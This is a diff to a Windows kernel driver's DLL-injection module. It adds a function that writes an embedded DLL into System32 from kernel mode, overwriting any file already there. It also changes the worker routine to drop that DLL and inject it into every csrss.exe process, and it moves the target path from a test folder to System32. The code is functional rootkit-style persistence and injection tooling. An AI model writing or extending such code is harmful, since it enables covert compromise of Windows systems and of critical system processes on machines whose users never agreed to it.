@@ -5,6 +5,7 @@
 #include <inc/pe.h>
 #include <inc/string.h>
 #include <injectstub/h/stub.h>
+#include <inc/kdll.h>
 
 #define __SUBCOMPONENT__ "inject"
 #define MODULE_TAG 'injc'
@@ -493,13 +494,67 @@ _next_process:
 	return STATUS_SUCCESS;
 }
 
+NTSTATUS InjectDllDrop(PUNICODE_STRING DllFilePath)
+{
+	OBJECT_ATTRIBUTES ObjectAttrib;
+	NTSTATUS Status;
+	HANDLE FileHandle = NULL;
+	IO_STATUS_BLOCK IoStatusBlock;
+
+	InitializeObjectAttributes(
+		&ObjectAttrib,
+		DllFilePath,
+		OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE,
+		NULL,
+		NULL);
+
+	Status =
+		ZwCreateFile(
+		&FileHandle,
+		GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE,
+		&ObjectAttrib,
+		&IoStatusBlock,
+		0L,
+		FILE_ATTRIBUTE_NORMAL,
+		FILE_SHARE_READ,
+		FILE_OVERWRITE_IF,
+		FILE_SYNCHRONOUS_IO_NONALERT,
+		NULL,
+		0);
+
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "Open file failed with err=%x", Status);
+		return Status;
+	}
+	
+	Status = ZwWriteFile(FileHandle, NULL, NULL, NULL, &IoStatusBlock, kdll_data(), kdll_data_size(), NULL, NULL);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "Write file failed with err=%x", Status);
+		goto cleanup;
+	}
+
+cleanup:
+	
+	if (FileHandle != NULL)
+		ZwClose(FileHandle);
+
+	return Status;
+}
 
 NTSTATUS InjectDllWorker(PINJECT_BLOCK Inject)
 {
 
 	UNICODE_STRING ProcPrefix = RTL_CONSTANT_STRING(L"csrss.exe");
-	UNICODE_STRING DllPath = RTL_CONSTANT_STRING(L"\\\\?\\C:\\test");
+	UNICODE_STRING DllPath = RTL_CONSTANT_STRING(L"\\SystemRoot\\System32");
 	UNICODE_STRING DllName = RTL_CONSTANT_STRING(L"kdll.dll");
+	UNICODE_STRING DllFilePath = RTL_CONSTANT_STRING(L"\\SystemRoot\\System32\\kdll.dll");
+	NTSTATUS Status;
+
+	Status = InjectDllDrop(&DllFilePath);
+	if (!NT_SUCCESS(Status)) {
+		KLog(LError, "InjectDllDrop failed with err=%x", Status);
+		return Status;
+	}
 
 	return InjectFindAllProcessesAndInjectDll(&ProcPrefix, &DllPath, &DllName);
 }
